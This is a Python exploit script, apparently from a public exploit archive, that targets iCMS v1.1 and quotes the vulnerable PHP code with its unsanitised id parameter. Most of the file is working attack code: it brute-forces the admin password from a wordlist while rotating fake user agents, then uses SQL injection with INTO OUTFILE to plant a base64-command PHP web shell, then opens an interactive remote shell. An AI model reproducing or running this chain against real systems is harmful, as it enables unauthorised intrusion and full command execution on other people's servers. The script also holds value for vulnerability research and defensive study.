#!/usr/bin/python
# ~INFORMATION
# Exploit Title:        iCMS v1.1 Admin SQLi/bruteforce Exploit
# Author:               TecR0c
# Date:                 18/3/2011
# Software link:        http://bit.ly/hbYy35
# Tested on:            Linux bt
# Version:              v1.1
# [XXX]: The likelihood of this exploit being successful is low
# as it requires knowledge of the web path and file privileges
# however a PoC is still written ;)

# ~VULNERABLE CODE:
'''
15 $id = $_GET['id'];
16 $title = NULL;
17 $text = NULL;
18 database_connect();
19 $query = "select title,text from icmscontent where id = $id;";
20 //echo $query;
21 $result = mysql_query($query);
'''
#~EXPLOIT
import random,time,sys,urllib,urllib2,re,httplib,socket,base64,os,getpass
from optparse import OptionParser
from urlparse import urlparse,urljoin
from urllib import urlopen
from cookielib import CookieJar

__AUTHOR__ ="TecR0c"
__DATE__ ="18.3.2011"

usage = 'Example : %s http://localhost/iCMS/ -w passwords.txt -p 127.0.0.1:8080' % __file__
parser = OptionParser(usage=usage)
parser.add_option("-p","--proxy", type="string",action="store", dest="proxy",
    help="HTTP Proxy <server>:<port>")
parser.add_option("-u","--username", type="string",action="store", default="admin", dest="username",
    help="Username for login")
parser.add_option("-w","--wordlist", type="string",action="store", dest="wordlist",
    help="file to use to bruteforce password")

(options, args) = parser.parse_args()

#VARS
sitePath = '/var/www/iCMS/icms/'
webshell = '<?php+system(base64_decode($_REQUEST[cmd]));?>'

if options.proxy:
    print '[+] Using Proxy'+options.proxy
# User Agents
agents = ["Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
    "Internet Explorer 7 (Windows Vista); Mozilla/4.0 ",
    "Google Chrome 0.2.149.29 (Windows XP)",
    "Opera 9.25 (Windows Vista)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
    "Opera/8.00 (Windows NT 5.1; U; en)"]
agent = random.choice(agents)

def banner():
    if os.name == "posix":
        os.system("clear")
    else:
        os.system("cls")
    header = '''
|----------------------------------------|
|Exploit: iCMS SQLi RCE
|Author: %s
|Date: %s
|----------------------------------------|\n
'''%(__AUTHOR__,__DATE__)
    for i in header:
        print "\b%s"%i,
        sys.stdout.flush()
        time.sleep(0.005)

def proxyCheck():
    if options.proxy:
        try:
            h2 = httplib.HTTPConnection(options.proxy)
            h2.connect()
            print "[+] Using Proxy Server:",options.proxy
        except(socket.timeout):
            print "[-] Proxy Timed Out\n"
            sys.exit(1)
        except(NameError):
            print "[-] Proxy Not Given\n"
            sys.exit(1)
        except:
            print "[-] Proxy Failed\n"
            sys.exit(1)

def getProxy():
    try:
        proxy_handler = urllib2.ProxyHandler({'http': options.proxy})
    except(socket.timeout):
        print "\n[-] Proxy Timed Out"
        sys.exit(1)
    return proxy_handler

cj = CookieJar()
if options.proxy:
    opener = urllib2.build_opener(getProxy(), urllib2.HTTPCookieProcessor(cj))
else:
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener.addheaders = [('User-agent', agent)]

def loginAttempt():
    try:
        passwordlist = open(options.wordlist,'r').readlines()
        print "[+] Length Of Wordlist: "+str(len(passwordlist))
    except(IOError):
        print "[-] Error: Check Your Wordlist Path\n"
        sys.exit(1)
    for password in passwordlist:
        password = password.replace("\r","").replace("\n","")
        sys.stdout.write('\r[+] Brute-forcing password with: %s          \r' % password)
        sys.stdout.flush()
        time.sleep(0.2)
        authenticated = login(password)
        if authenticated:
            break

def login(password):
    webSiteUrl = url.geturl()+'login.php'
    postParameters = {'formlogin' : options.username,'formpass' : password}
    postParameters = urllib.urlencode(postParameters)
    try:
        response = opener.open(webSiteUrl, postParameters).read()
    except:
        print '\n[-] Could not connect'
        sys.exit()
    loggedIn = re.compile(r"continue to the admin")
    authenticated = loggedIn.search(response)
    if authenticated:
        print '\n[+] logged in as %s' % options.username
    else:
        pass
    return authenticated

def performSQLi():
    webSiteUrl = url.geturl()+"/admin/item_detail.php?id=1+union+select+'ph33r',user()"
    try:
        response = opener.open(webSiteUrl).read()
    except:
        print '\n[-] Failed'
    root = re.compile("root")
    rootuser = root.search(response)
    if rootuser:
        print '[+] I smell ROOT :p~'
        webSiteUrl = url.geturl()+\
        "admin/item_detail.php?id=1+UNION+SELECT+NULL,'TECR0CSHELL"\
        +webshell+"LLEHSC0RCET'+INTO+OUTFILE+'"+sitePath+".webshell.php'"
        opener.open(webSiteUrl)
        print '[+] Wrote WEBSHELL !'
    else:
        print '\n[-] Could not gain access'
        sys.exit()

def postRequestWebShell(encodedCommand):
    webSiteUrl = url.geturl()+'.webshell.php'
    commandToExecute = [
    ('cmd',encodedCommand)]
    cmdData = urllib.urlencode(commandToExecute)
    try:
        response = opener.open(webSiteUrl, cmdData).read()
    except:
        print '[-] Failed'
        sys.exit()
    return response

def clean(response):
    patFinder = re.compile('TECR0CSHELL(.*)LLEHSC0RCET',re.DOTALL)
    shell = patFinder.search(response)
    response = shell.group(1)
    return response

def commandLine():
    commandLine = ('[RSHELL] %s@%s# ') % (getpass.getuser(),url.netloc)
    while True:
        try:
            command = raw_input(commandLine)
            encodedCommand = base64.b64encode(command)
            response = postRequestWebShell(encodedCommand)
            response = clean(response)
            print response
        except KeyboardInterrupt:
            encodedCommand = base64.b64encode('rm .webshell.php')
            postRequestWebShell(encodedCommand)
            print "\n[!] Removed .webshell.php\n"
            sys.exit()

if "__main__" == __name__:
    banner()
    try:
        url=urlparse(args[0])
    except:
        parser.print_help()
        sys.exit()
    getProxy()
    loginAttempt()
    performSQLi()
    commandLine()